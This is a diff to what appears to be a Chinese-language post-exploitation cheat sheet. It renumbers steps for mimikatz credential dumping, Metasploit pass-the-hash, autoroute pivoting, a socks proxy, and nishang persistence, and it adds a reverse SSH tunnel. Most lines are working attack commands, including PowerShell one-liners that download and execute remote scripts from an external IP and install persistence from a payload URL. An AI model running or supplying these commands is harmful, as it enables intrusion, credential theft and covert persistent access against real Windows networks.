@@ -28,17 +28,20 @@ powershell.exe  -nop -exec bypass  -c "IEX (New-Object Net.WebClient).DownloadSt
 或者
 meterpreter load mimikatz
 
-7、hash传递登录
+8、hash传递登录
  use exploit/windows/smb/psexec_psh
  
  
-8、添加路由
+9、添加路由
 post/multi/manage/autoroute
 
 
-9、proxychains socks 代理
+10、proxychains socks 代理
 use auxiliary/server/socks4a
 
 
-10、持久化nishang
+11、持久化nishang
 powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://121.43.xx.xx:8888/Add-Persistence.ps1');Add-Persistence -PayloadURL http://121.xx.xx.43:8888/https5555.ps1"
+
+12、
+ssh -N -R 5555:192.168.2.100:5555 root@121.xx.xx.43
